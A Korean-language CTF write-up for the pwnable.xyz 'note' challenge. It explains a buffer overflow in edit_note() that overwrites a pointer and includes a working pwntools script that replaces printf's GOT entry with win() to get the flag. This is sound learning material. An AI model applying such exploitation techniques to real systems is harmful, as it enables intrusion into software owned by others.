# [pwnable.xyz] note

> Note taking 101

## Bug

![image](https://github.com/user-attachments/assets/ead3d470-839e-4f49-8509-46856322206d)

`edit_note()`에서 길이 제한이 없어서 `note`에 buffer overflow가 발생한다.

![image](https://github.com/user-attachments/assets/c1181d50-c267-4b42-8fb0-7faa6a483ef6)

이를 이용하여 `note` 뒤쪽의 `desc`에 임의의 주소를 넣을 수 있다.

![image](https://github.com/user-attachments/assets/4f07d4ce-d26f-480e-9499-87f09aeb3d4c)

`desc`에 넣은 주소에 `0x20`바이트만큼 임의의 값을 쓸 수 있다.

## Exploit

`printf()`의 GOT를 `win()`의 주소로 덮으면 `print_menu()` 내부에서 `printf()`가 호출되어 플래그를 획득할 수 있다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30016)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40093C
printf_got = 0x601238

sla(b"> ", b"1")
sla(b"Note len? ", str(0x28).encode())
sa(b"note: ", b"a" * 0x20 + p64(printf_got))

sla(b"> ", b"2")
sa(b"desc: ", p64(win))

r.interactive()
```

![image](https://github.com/user-attachments/assets/93c603f2-25f7-4bc5-b0ef-ed82d6057d54)
